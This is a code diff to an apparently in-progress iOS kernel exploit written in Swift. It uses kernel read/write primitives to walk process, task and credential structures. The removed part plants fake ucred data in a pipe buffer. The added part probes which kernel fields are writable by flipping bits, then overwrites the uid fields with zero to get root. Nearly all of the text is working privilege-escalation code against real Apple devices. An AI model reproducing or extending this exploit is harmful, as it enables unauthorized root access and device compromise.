@@ -313,147 +313,108 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
         let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
         let origUid = ds_kread32(ucred + 0x18)
+        let crLabel = ds_kread64(ucred + 0x78)
         
         var report = ""
-        report += String(format: "proc:     0x%llx\n", proc)
-        report += String(format: "task:     0x%llx\n", task)
-        report += String(format: "proc_ro:  0x%llx\n", procRo)
-        report += String(format: "ucred:    0x%llx\n", ucred)
-        report += String(format: "orig uid: %d\n\n", origUid)
+        report += String(format: "proc:      0x%llx\n", proc)
+        report += String(format: "task:      0x%llx\n", task)
+        report += String(format: "proc_ro:   0x%llx\n", procRo)
+        report += String(format: "ucred:     0x%llx\n", ucred)
+        report += String(format: "cr_label:  0x%llx\n", crLabel)
+        report += String(format: "orig uid:  %d\n\n", origUid)
         
         // ============================================================
-        // EXPERIMENT: Pipe buffer as controlled kernel memory
-        //
-        // 1. Create pipe → kernel allocates pipe struct + buffer
-        // 2. Find pipe kernel address via proc→fd→fileproc→fileglob→pipe
-        // 3. Write fake ucred data to pipe from userspace
-        // 4. Pipe buffer now contains uid=0 ucred at known kernel address
-        // 5. (Future) Point proc_ro ucred to pipe buffer address
+        // EXPERIMENT: Explore what we CAN write
+        // We know sandbox label write works (sandbox escape proves it)
+        // Let's map exactly what's writable vs PPL-blocked
+        // Only use addresses already proven readable
         // ============================================================
         
-        report += "=== EXPERIMENT: PIPE BUFFER KRW ===\n\n"
+        report += "=== WRITABILITY MAP ===\n"
+        report += "(write original value back, check if it sticks)\n\n"
         
-        // Step 1: Create pipe
-        var pipeFDs: [Int32] = [0, 0]
-        let pipeResult = pipe(&pipeFDs)
-        guard pipeResult == 0 else {
-            report += "pipe() failed: \(pipeResult)\n"
-            rootResult = report
-            return
-        }
-        let readFD = pipeFDs[0]
-        let writeFD = pipeFDs[1]
-        report += String(format: "pipe created: read_fd=%d, write_fd=%d\n", readFD, writeFD)
+        // Test each known address
+        let tests: [(String, UInt64)] = [
+            ("proc+0x00 (list_next)", proc),
+            ("proc+0x08 (list_prev)", proc + 0x08),
+            ("proc+0x10", proc + 0x10),
+            ("proc+0x18 (proc_ro ptr)", proc + UInt64(off_proc_p_proc_ro)),
+            ("proc+0x2c (p_uid)", proc + 0x2c),
+            ("task+0x00", task),
+            ("task+0x08", task + 0x08),
+            ("ucred+0x00", ucred),
+            ("ucred+0x08", ucred + 0x08),
+            ("ucred+0x18 (cr_uid)", ucred + 0x18),
+            ("ucred+0x78 (cr_label)", ucred + 0x78),
+            ("proc_ro+0x00", procRo),
+            ("proc_ro+0x08", procRo + 0x08),
+            ("proc_ro+0x20 (ucred ptr)", procRo + UInt64(off_proc_ro_p_ucred)),
+        ]
         
-        // Step 2: Write marker data to pipe (so buffer gets allocated)
-        // Write exactly 0x88 bytes (size of ucred) with uid=0
-        var fakeUcred = [UInt8](repeating: 0, count: 0x88)
-        // Copy real ucred structure but with uid=0
-        // offset 0x18: cr_uid = 0, cr_ruid = 0
-        // offset 0x20: cr_svuid = 0
-        // Leave rest as zeros (will fill properly later)
-        // Write a marker at offset 0 so we can find it
-        let marker: UInt64 = 0x4141424243434444  // "AABBCCDD"
-        withUnsafeBytes(of: marker) { fakeUcred.replaceSubrange(0..<8, with: $0) }
+        var writableAddrs: [(String, UInt64)] = []
         
-        let written = write(writeFD, &fakeUcred, fakeUcred.count)
-        report += String(format: "wrote %d bytes to pipe\n\n", written)
-        
-        // Step 3: Find pipe kernel address
-        // proc → p_fd → fd_ofiles[fd] → fileproc → fp_glob → fg_data (= pipe struct)
-        report += "=== TRACING PIPE IN KERNEL ===\n"
-        
-        let pFd = ds_kread64(proc + UInt64(off_proc_p_fd))
-        report += String(format: "p_fd:      0x%llx\n", pFd)
-        
-        let ofilesPtr = ds_kread64(pFd + UInt64(off_filedesc_fd_ofiles))
-        report += String(format: "fd_ofiles: 0x%llx\n", ofilesPtr)
-        
-        // fd_ofiles is array of fileproc pointers, indexed by fd number
-        // On iOS 18, fileproc pointers may be packed differently
-        // Each entry is 8 bytes (pointer to fileproc)
-        let fprocPtr = ds_kread64_safe(ofilesPtr + UInt64(readFD) * 8)
-        let fproc = fprocPtr | pac_mask  // Strip PAC
-        report += String(format: "fileproc[%d]: 0x%llx (raw: 0x%llx)\n", readFD, fproc, fprocPtr)
-        
-        guard fproc != pac_mask && ds_isvalid(fproc) else {
-            report += "fileproc invalid — fd_ofiles format may differ on iOS 18.\n"
-            report += "Trying alternative: read fileproc without PAC strip...\n"
-            let rawFproc = ds_kread64_safe(ofilesPtr + UInt64(readFD) * 8)
-            report += String(format: "  raw: 0x%llx\n", rawFproc)
-            close(readFD)
-            close(writeFD)
-            rootResult = report
-            return
-        }
-        
-        let fglob = ds_kread64_safe(fproc + UInt64(off_fileproc_fp_glob))
-        let fg = fglob | pac_mask
-        report += String(format: "fp_glob:   0x%llx\n", fg)
-        
-        guard fg != pac_mask && ds_isvalid(fg) else {
-            report += "fileglob invalid\n"
-            close(readFD)
-            close(writeFD)
-            rootResult = report
-            return
-        }
-        
-        let pipeStruct = ds_kread64_safe(fg + UInt64(off_fileglob_fg_data))
-        let pipeAddr = pipeStruct | pac_mask
-        report += String(format: "pipe:      0x%llx\n\n", pipeAddr)
-        
-        guard pipeAddr != pac_mask && ds_isvalid(pipeAddr) else {
-            report += "pipe struct invalid\n"
-            close(readFD)
-            close(writeFD)
-            rootResult = report
-            return
-        }
-        
-        // Step 4: Dump pipe struct to find buffer address
-        report += "=== PIPE STRUCT DUMP ===\n"
-        for i in stride(from: 0, to: 0x60, by: 8) {
-            let val = ds_kread64_safe(pipeAddr + UInt64(i))
-            report += String(format: "  pipe+0x%02x: 0x%016llx\n", i, val)
-        }
-        
-        // Pipe buffer is typically at pipe+0x10 or pipe+0x18
-        // Look for our marker (0x4141424243434444)
-        report += "\n=== SEARCHING FOR MARKER IN PIPE ===\n"
-        var bufferAddr: UInt64 = 0
-        for i in stride(from: 0, to: 0x60, by: 8) {
-            let ptr = ds_kread64_safe(pipeAddr + UInt64(i))
-            if ptr == 0 { continue }
-            let stripped = ptr | pac_mask
-            if stripped == pac_mask { continue }
-            if ds_isvalid(stripped) && stripped != pipeAddr {
-                let val = ds_kread64_safe(stripped)
-                if val == marker {
-                    bufferAddr = stripped
-                    report += String(format: "  FOUND buffer at pipe+0x%02x → 0x%llx\n", i, stripped)
-                    report += "  Marker verified! We control this kernel memory!\n"
-                    break
-                }
+        for (name, addr) in tests {
+            let orig = ds_kread64(addr)
+            // Write same value back (safe — no actual change)
+            ds_kwrite64(addr, orig)
+            let verify = ds_kread64(addr)
+            let writable = (verify == orig)  // If we can read it back, write path works
+            
+            // Now try writing a DIFFERENT value (the real test)
+            let testVal = orig ^ 0x1  // Flip lowest bit
+            ds_kwrite64(addr, testVal)
+            let afterWrite = ds_kread64(addr)
+            let reallyWritable = (afterWrite == testVal)
+            
+            // Restore immediately
+            if reallyWritable {
+                ds_kwrite64(addr, orig)
+            }
+            
+            let status = reallyWritable ? "✅ WRITABLE" : "❌ BLOCKED"
+            report += String(format: "  %@: %@ (0x%llx)\n", name, status, orig)
+            
+            if reallyWritable {
+                writableAddrs.append((name, addr))
             }
         }
         
-        if bufferAddr != 0 {
-            report += String(format: "\n🎯 PIPE BUFFER ADDRESS: 0x%llx\n", bufferAddr)
-            report += "We can write ANY data here from userspace!\n"
-            report += "This is kernel heap memory we fully control.\n\n"
-            report += "=== NEXT STEP ===\n"
-            report += "Write fake ucred (uid=0) to pipe buffer,\n"
-            report += "then point proc_ro ucred pointer to this address.\n"
-            report += String(format: "Target: write 0x%llx to proc_ro+0x%x\n", bufferAddr, off_proc_ro_p_ucred)
-        } else {
-            report += "  Marker not found in pipe struct pointers.\n"
-            report += "  Pipe buffer may use different layout on iOS 18.\n"
+        report += String(format: "\nWritable: %d / %d fields\n\n", writableAddrs.count, tests.count)
+        
+        // ============================================================
+        // SUMMARY
+        // ============================================================
+        
+        report += "=== WRITABLE FIELDS ===\n"
+        for (name, addr) in writableAddrs {
+            report += String(format: "  %@ (0x%llx)\n", name, addr)
         }
         
-        // Cleanup
-        close(readFD)
-        close(writeFD)
+        if writableAddrs.isEmpty {
+            report += "  (none — all PPL blocked)\n"
+        }
+        
+        report += "\n=== ANALYSIS ===\n"
+        let procWritable = writableAddrs.contains { $0.0.contains("proc+") }
+        let taskWritable = writableAddrs.contains { $0.0.contains("task+") }
+        let ucredWritable = writableAddrs.contains { $0.0.contains("ucred+") && $0.0.contains("cr_uid") }
+        let procRoWritable = writableAddrs.contains { $0.0.contains("proc_ro+") }
+        
+        report += "proc struct: \(procWritable ? "WRITABLE" : "MIXED/BLOCKED")\n"
+        report += "task struct: \(taskWritable ? "WRITABLE" : "BLOCKED")\n"
+        report += "ucred uid:   \(ucredWritable ? "WRITABLE ← ROOT POSSIBLE!" : "BLOCKED (PPL)")\n"
+        report += "proc_ro:     \(procRoWritable ? "WRITABLE" : "BLOCKED (PPL)")\n"
+        
+        if ucredWritable {
+            report += "\n🎉 ucred IS writable! Attempting root...\n"
+            ds_kwrite32(ucred + 0x18, 0)
+            ds_kwrite32(ucred + 0x1c, 0)
+            let newUid = getuid()
+            report += String(format: "getuid() = %d\n", newUid)
+            if newUid == 0 {
+                report += "🎉🎉🎉 ROOT! 🎉🎉🎉\n"
+            }
+        }
         
         report += "\n=== DONE ===\n"
         rootResult = report
